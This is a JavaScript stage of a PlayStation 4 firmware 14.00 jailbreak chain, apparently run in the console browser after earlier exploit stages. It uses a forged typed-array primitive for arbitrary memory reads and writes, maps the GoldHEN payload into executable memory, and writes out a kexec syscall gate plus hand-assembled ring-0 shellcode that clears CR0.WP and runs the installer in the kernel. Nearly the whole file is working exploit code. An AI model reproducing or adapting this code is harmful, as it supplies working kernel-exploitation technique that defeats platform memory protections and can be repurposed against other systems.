// Stage GoldHEN v2: run the official 14.00 installer in ring 0.
//
// Preconditions: uid=0 (stage_uid_v1), a jitshm RWX page (stage_jit_v1), a
// sandbox-escaped process (stage_prison_v1), safedown, and the reviewed
// 14.00 patch set (stage_patch_v1, run earlier by chain.py).
//
// goldhen.bin is not a thread entry. Its first five bytes are `jmp rel32` to
// 0x16ab, which asks 0x1ec5 whether the pointer it was handed lives in kernel
// space. A pthread start hands it user-space registers, so the entry takes
// the "not in the kernel" branch and issues syscall(11, 0x1653) with a
// *literal* address: through the kexec gate that is a jump to 0x1653 with
// nothing mapped there. That is what stage_goldhen_v1 did, and it powered the
// console off right after pthread_create returned.
//
// The installer proper starts at 0x1653 and is meant to be entered through
// the kexec gate, i.e. `syscall 11` with the first argument pointing at the
// loaded image + 0x1653. It then does all of its work in ring 0:
//
//   0x1e85  firmware detection + GOT fill (reads /s/release_ at
//           kbase+0x1300000 through rdmsr(LSTAR))
//   0x87a   already-installed check
//   0x1620  -> 0x150e (its four kernel patches, clears CR0.WP itself)
//           -> 0x1418 (ASCII banner)
//           -> 0x157c, which SHA-256s image[0, 0x75de), decrypts
//              image[0x75e0, 0x481e8) in place with that key, asks the
//              kernel allocator at [0x48c38] for 3 * 0x40c08 = 0xc2418
//              bytes and inflates the 638712-byte kernel payload straight
//              into it, then calls the payload entry 0x25f8
//
// The kernel payload then installs GoldHEN's hooks and services (FTP 2121,
// binloader 9090, klog 3232) and returns 0.
//
// The reference driver wraps *every* step of the payload's own init in
// `cli`-free CR0.WP off/on, because the payload writes its BSS 83 times
// without bracketing; with WP=1 those writes are the "delayed death" (klog
// comes up, FTP never does). A single call cannot bracket each step, so the
// whole installer runs with WP cleared and the stack 16-byte aligned:
//
//   mov rax,cr0; push rax; push rbx; mov rbx,rsp; and rsp,-16
//   movabs rax, image+0x1653; call rax
//   mov rdx,rax; mov rsp,rbx; pop rbx; pop rax; mov cr0,rax; mov rax,rdx; ret
//
// If the installer returns, WP is restored. If it hangs, WP stays clear, which
// is harmless once GoldHEN has turned it back on itself.
//
// The image is position independent: every string and GOT reference is
// RIP-relative, and 0x157c computes its own base with `lea -0x15a1(%rip)`.
// It therefore does not need the fixed 0x926200000 map v1 used. It is copied
// into a fresh anonymous RWX mapping -- the shape the reference 14.00 loader
// uses for the ring-0 trampoline -- and touched page by page first so that
// no page is faulted lazily from ring 0. The two-instruction userland gate
// stub goes into stage_jit_v1's high-address jitshm page, because the native
// caller refuses to target addresses below 4 GiB.
var GH_SIZE = 297496, GH_INSTALL = 0x1653, GH_SPAN = 0x4b000;
var GH_MAP = 0x926200000;            // fallback jitshm map (v1's address)
var R0_STUB = 0x49000;               // ring-0 self test, past image+0x48a18
var R0_WRAP = 0x49100;               // WP-off wrapper, same page as R0_STUB
var GH_URL = "/goldhen.bin";
var phase = "preflight";

function fail(message) {
  return [{ id: "stage_goldhen_v2", status: "error",
            details: { phase: phase, error: String(message).slice(0, 220) } }];
}

return (async function () {
  try {
    var n = window.__fw14NativeInvoke;
    var state = window.__fw14ArrayState;
    if (!n || !n.frame || !n.wrappers || !Number.isSafeInteger(n.frameAddress) ||
        !state || state.array[0] !== state.a || !state.view ||
        !state.ownedTypedView || !Number.isSafeInteger(state.calibratedViewBase) ||
        !Number.isInteger(state.index))
      throw new Error("caller_missing");
    if (typeof n.callAddr !== "function") throw new Error("calladdr_missing");
    var su = window.__fw14StageU, jit = window.__fw14StageJit;
    if (!su || su.uid !== 0) throw new Error("uid_missing");
    if (!jit || !Number.isSafeInteger(jit.addr) || jit.addr <= 0)
      throw new Error("jit_missing");
    var SCRATCH = jit.addr;
    var GATE = SCRATCH;               // b8 0b 00 00 00 0f 05 c3
    var PATHBUF = SCRATCH + 0x100;
    var KBUF = SCRATCH + 0x1000;
    var need = ["sys477", "getpid", "sys24", "open", "read", "close"];
    for (var mi = 0; mi < need.length; mi++)
      if (typeof n.wrappers[need[mi]] !== "number")
        throw new Error("wrappers_missing_" + need[mi]);

    var forged = state.view;
    var carrier = state.ownedTypedView;
    var base = state.calibratedViewBase;
    function bytesAt(index, count) {
      var out = [];
      for (var i = 0; i < count; i++) out.push(forged[index + i]);
      return out;
    }
    function valueOf(bytes) {
      var v = 0;
      for (var i = bytes.length - 1; i >= 0; i--) v = v * 256 + bytes[i];
      return v;
    }
    function pointerBytes(value) {
      var out = [];
      for (var i = 0; i < 8; i++)
        out.push(Math.floor(value / Math.pow(2, i * 8)) & 255);
      return out;
    }
    function addressOf(object) {
      try {
        state.array[0] = object;
        return valueOf(bytesAt(state.index, 8));
      } finally {
        state.array[0] = state.a;
      }
    }
    var carrierSlot = addressOf(carrier) - base + 8;
    if (!Number.isSafeInteger(carrierSlot) || carrierSlot < 0 ||
        carrierSlot + 8 >= 16777216)
      throw new Error("carrier_slot_invalid");
    var carrierOriginal = bytesAt(carrierSlot, 8);
    function setCarrier(addr) {
      var next = pointerBytes(addr);
      for (var i = 0; i < 8; i++) forged[carrierSlot + i] = next[i];
    }
    function restoreCarrier() {
      for (var i = 0; i < 8; i++)
        forged[carrierSlot + i] = carrierOriginal[i];
    }
    function poke(addr, bytes) {
      setCarrier(addr);
      for (var i = 0; i < bytes.length; i++) carrier[i] = bytes[i];
      restoreCarrier();
    }
    function peek(addr, count) {
      setCarrier(addr);
      var out = [];
      for (var i = 0; i < count; i++) out.push(carrier[i]);
      restoreCarrier();
      return out;
    }
    function isErr(r) {
      return !!r && r.value === -1 && (r.high >>> 0) === 0xffffffff;
    }
    function eTag(r) {
      if (!isErr(r)) return "v" + r.value;
      var e = n.readErrno();
      return "e" + (e === null ? r.value : e);
    }
    function hex(v) { return "0x" + Math.floor(v).toString(16); }
    function pair(addr) {
      return [addr >>> 0, Math.floor(addr / 0x100000000) >>> 0];
    }
    function full64(r) {
      return (r.high >>> 0) * 0x100000000 + (r.value >>> 0);
    }
    function addrOf(r) {
      if (isErr(r)) return -1;
      var a = full64(r);
      return (a > 0 && a < 0x1000000000000) ? a : -1;
    }
    function cstring(t) {
      var out = [];
      for (var i = 0; i < t.length; i++) out.push(t.charCodeAt(i) & 255);
      out.push(0);
      return out;
    }
    function putString(addr, t) { poke(addr, cstring(t)); }
    function mark(m) {
      if (typeof api !== "undefined" && api && typeof api.markSync === "function")
        api.markSync(m);
    }

    var pid = n.call("getpid", []).value;
    var uidTag = eTag(n.call("sys24", []));

    // ------------------------------------------------------- fetch image
    phase = "fetch";
    mark("goldhen_fetch");
    var response = await fetch(GH_URL, { cache: "no-store" });
    if (!response.ok) throw new Error("goldhen_http_" + response.status);
    var image = new Uint8Array(await response.arrayBuffer());
    if (image.length !== GH_SIZE)
      throw new Error("goldhen_size_" + image.length);
    if (image[0] !== 0xe9) throw new Error("goldhen_head_" + image[0]);

    // ------------------------------------------------------- map image
    // A fresh anonymous RWX mapping is what the reference loader runs its
    // ring-0 trampoline from; the exploit's patch set has already made it
    // executable. Fall back to v1's jitshm + MAP_FIXED shape if the kernel
    // still refuses PROT_EXEC on anonymous memory.
    phase = "mmap";
    mark("goldhen_mmap");
    var mapAddr = -1, mapKind = "anon", jd = -1, mapTag = "-";
    var mRes = n.call("sys477", [0, GH_SPAN, 7, 0x1002, 0xffffffff, 0]);
    mapTag = eTag(mRes);
    mapAddr = addrOf(mRes);
    if (mapAddr > 0) {
      // fresh anonymous mapping
    } else {
      mapKind = "jitshm";
      if (typeof n.wrappers.sys533 !== "number")
        throw new Error("mmap" + mapTag + "_no_sys533");
      var jRes = n.call("sys533", [0, GH_SPAN, 7, 0, 0, 0]);
      if (isErr(jRes) || jRes.value < 0) throw new Error("jitshm" + eTag(jRes));
      jd = jRes.value;
      var fRes = n.call("sys477", [GH_MAP, GH_SPAN, 7, 17, jd, 0]);
      mapTag = eTag(fRes);
      mapAddr = addrOf(fRes);
      if (mapAddr < 0) throw new Error("map" + mapTag);
    }
    if (mapAddr < 0 || mapAddr >= 0x1000000000000)
      throw new Error("map_addr_" + hex(mapAddr >>> 0));

    // ------------------------------------------------------- touch + copy
    // Every page is written before ring 0 sees it: a lazily mapped page
    // would fault in kernel mode, which is a power-off with no signal.
    phase = "touch";
    mark("goldhen_touch");
    for (var to = 0; to < GH_SPAN; to += 0x1000) poke(mapAddr + to, [0]);
    poke(mapAddr, [0xe9, 0x00, 0x00, 0x00, 0x00]);
    if (peek(mapAddr, 5).join(",") !== "233,0,0,0,0")
      throw new Error("map_write_probe_failed");
    phase = "write";
    mark("goldhen_write");
    var CHUNK = 65536;
    for (var off = 0; off < image.length; off += CHUNK) {
      var end = Math.min(off + CHUNK, image.length);
      setCarrier(mapAddr + off);
      for (var i = off; i < end; i++) carrier[i - off] = image[i];
      restoreCarrier();
    }

    // ------------------------------------------------------- verify image
    phase = "verify";
    mark("goldhen_verify");
    var head = peek(mapAddr, 8);
    var rel = (head[1] | (head[2] << 8) | (head[3] << 16) | (head[4] << 24)) >>> 0;
    var entry = 5 + rel;
    var tailWant = Array.from(image.subarray(image.length - 8));
    var tailGot = peek(mapAddr + image.length - 8, 8);
    var tailOk = tailWant.join(",") === tailGot.join(",");
    var bssNonZero = 0;
    for (var bi = GH_SIZE; bi < R0_STUB; bi += 8)
      if (peek(mapAddr + bi, 8).join(",") !== "0,0,0,0,0,0,0,0") bssNonZero++;
    if (entry !== 0x16ab)
      throw new Error("goldhen_entry_" + entry.toString(16));
    if (!tailOk) throw new Error("goldhen_tail");

    // ------------------------------------------------------- stubs
    // Ring-0 self test: `mov eax,0x1234; ret`. It is entered through the
    // kexec gate like the installer, and proves both the gate and that this
    // mapping is executable from ring 0 before GoldHEN goes into the kernel.
    // Gate stub: `mov eax,11; syscall; ret`, called from userland by the
    // native caller with the jump target as the first argument.
    phase = "stubs";
    poke(mapAddr + R0_STUB, [0xb8, 0x34, 0x12, 0x00, 0x00, 0xc3]);
    poke(GATE, [0xb8, 0x0b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc3]);
    if (peek(GATE, 8).join(",") !== "184,11,0,0,0,15,5,195")
      throw new Error("gate_stub_bad");

    // ------------------------------------------------------- gate self test
    phase = "gate";
    mark("goldhen_gate");
    var gateRc = -1;
    try {
      var g = n.callAddr(GATE, [pair(mapAddr + R0_STUB)]);
      gateRc = g ? (g.value >>> 0) : -1;
    } catch (ge) {
      throw new Error("gate_call_" + String(ge).slice(0, 60));
    }
    if (gateRc !== 0x1234)
      throw new Error("gate_rc_" + (gateRc >>> 0).toString(16));

    // ------------------------------------------------------- installer
    // 0x1653 repeats the firmware detection, applies its own four patches,
    // prints the banner, decrypts and inflates the kernel payload into a
    // kernel allocation and calls the payload entry 0x25f8.
    //
    // It is entered through the WP-off wrapper above, not directly: the
    // payload's init writes its BSS after the klog step and those writes
    // fault when the kernel's CR0.WP is set.
    phase = "wrap";
    mark("goldhen_wrap");
    var wrap = [0x0f, 0x20, 0xc0,        // mov rax,cr0
                0x50,                    // push rax
                0x53,                    // push rbx
                0x48, 0x89, 0xe3,        // mov rbx,rsp
                0x48, 0x83, 0xe4, 0xf0,  // and rsp,-16
                0x48, 0xb8];             // movabs rax, target
    wrap = wrap.concat(pointerBytes(mapAddr + GH_INSTALL));
    wrap = wrap.concat([0xff, 0xd0,      // call rax
                        0x48, 0x89, 0xc2,// mov rdx,rax
                        0x48, 0x89, 0xdc,// mov rsp,rbx
                        0x5b,            // pop rbx
                        0x58,            // pop rax
                        0x0f, 0x22, 0xc0,// mov cr0,rax
                        0x48, 0x89, 0xd0,// mov rax,rdx
                        0xc3]);          // ret
    poke(mapAddr + R0_WRAP, wrap);
    if (peek(mapAddr + R0_WRAP, wrap.length).join(",") !== wrap.join(","))
      throw new Error("wrap_stub_bad");

    phase = "install";
    mark("goldhen_install");
    var installRc = -1, installErr = "";
    try {
      var r = n.callAddr(GATE, [pair(mapAddr + R0_WRAP)]);
      installRc = r ? (r.value >>> 0) : -1;
    } catch (ie) {
      installErr = String(ie).slice(0, 80);
      installRc = -2;
    }

    // ------------------------------------------------------- klog evidence
    // The kernel payload's banner and its closing line go to klog. Reading
    // them is best effort: the point is to tell "All done" apart from an
    // early return, not to make the install depend on the read.
    phase = "klog";
    var klogTag = "-", klogAll = 0, klogLoaded = 0, klogGh = 0, klogBytes = 0;
    try {
      putString(PATHBUF, "/dev/klog");
      var o = n.call("open", [PATHBUF, 4, 0]);   // O_RDONLY | O_NONBLOCK
      if (isErr(o) || o.value < 0) {
        klogTag = "open" + eTag(o);
      } else {
        var fd = o.value, all = [];
        for (var ri = 0; ri < 32 && all.length < 131072; ri++) {
          var rd = n.call("read", [fd, KBUF, 4096]);
          if (isErr(rd) || rd.value <= 0) break;
          var take = Math.min(rd.value, 4096);
          var chunk = peek(KBUF, take);
          for (var ki = 0; ki < chunk.length; ki++) all.push(chunk[ki]);
          if (take < 4096) break;
        }
        n.call("close", [fd]);
        klogBytes = all.length;
        function count(s) {
          var pat = cstring(s).slice(0, -1), hits = 0;
          for (var p = 0; p + pat.length <= all.length; p++) {
            var ok = true;
            for (var q = 0; q < pat.length; q++)
              if (all[p + q] !== pat[q]) { ok = false; break; }
            if (ok) hits++;
          }
          return hits;
        }
        klogAll = count("All done");
        klogLoaded = count("loaded!");
        klogGh = count("GoldHEN");
        klogTag = "n" + klogBytes + "/g" + klogGh + "/l" + klogLoaded +
                   "/a" + klogAll;
      }
    } catch (ke) {
      klogTag = "err_" + String(ke).slice(0, 40);
    }

    // ------------------------------------------------------- outcome
    phase = "outcome";
    var post = null, intact = false;
    try {
      post = n.call("getpid", []);
      intact = post.value === pid && post.high === 0 &&
        state.array[0] === state.a &&
        bytesAt(carrierSlot, 8).join(",") === carrierOriginal.join(",");
    } catch (pe) {
      intact = false;
    }
    var stateName = "called";
    if (klogAll > 0) stateName = "installed";
    else if (klogLoaded > 0) stateName = "loaded";
    else if (installRc === -2) stateName = "call_error";
    window.__fw14StageGoldhen = {
      installed: stateName === "installed" || stateName === "loaded",
      called: installRc !== -2, addr: mapAddr, kind: mapKind,
      entry: entry, rc: installRc, pid: pid
    };
    return [{
      id: "stage_goldhen_v2",
      status: (stateName === "installed" || stateName === "loaded" ||
               stateName === "called") ? "pass" : "fail",
      details: {
        pid: pid, uid: uidTag, map: mapKind + "@" + hex(mapAddr),
        image: image.length + "@" + hex(head[0]) + "/" + (tailOk ? "tail" : "bad"),
        entry: hex(entry), bss: String(bssNonZero),
        gate: "0x" + (gateRc >>> 0).toString(16),
        rc: (installRc >>> 0).toString(16),
        klog: klogTag.slice(0, 120),
        err: installErr,
        state: stateName,
        intact: intact
      }
    }];
  } catch (error) {
    return fail(error);
  }
})();
